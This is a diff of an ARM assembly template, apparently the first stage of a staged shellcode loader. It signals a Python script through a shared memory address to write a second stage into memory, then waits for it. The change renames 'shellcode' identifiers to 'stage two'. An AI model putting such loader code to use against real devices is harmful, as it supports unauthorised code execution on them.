@@ -61,25 +61,25 @@ store_rw_block_address:
 	add r9, r9, #4
 	str r10, [r9]
 
-// overwrite communications address with [VARIABLE:STATE_READY_FOR_SHELLCODE_WRITE:VARIABLE]
+// overwrite communications address with [VARIABLE:STATE_READY_FOR_STAGE_TWO_WRITE:VARIABLE]
 // so that the Python script knows it can write stage 2 to memory
 
 	ldr r0, [pc]
-	b store_state_ready_for_shellcode_write
+	b store_state_ready_for_stage_two_write
 
-state_ready_for_shellcode_write:
-	.word [VARIABLE:STATE_READY_FOR_SHELLCODE_WRITE:VARIABLE]
+state_ready_for_stage_two_write:
+	.word [VARIABLE:STATE_READY_FOR_STAGE_TWO_WRITE:VARIABLE]
 	.balign 4
 
-store_state_ready_for_shellcode_write:
+store_state_ready_for_stage_two_write:
 	str r0, [r12]
 
 // load the value that indicates shellcode written into r8
 	ldr r8, [pc]
 	b begin_waiting1
 
-state_shellcode_written:
-	.word [VARIABLE:STATE_SHELLCODE_WRITTEN:VARIABLE]
+state_stage_two_written:
+	.word [VARIABLE:STATE_STAGE_TWO_WRITTEN:VARIABLE]
 	.balign 4
 
 begin_waiting1:
@@ -97,7 +97,7 @@ begin_waiting2:
 	mov r0, r5
 	mov r1, r5
 
-// wait for value at communications address to be [VARIABLE:STATE_SHELLCODE_WRITTEN:VARIABLE] before proceeding
+// wait for value at communications address to be [VARIABLE:STATE_STAGE_TWO_WRITTEN:VARIABLE] before proceeding
 wait_for_script:
 
 	// sleep 1 second
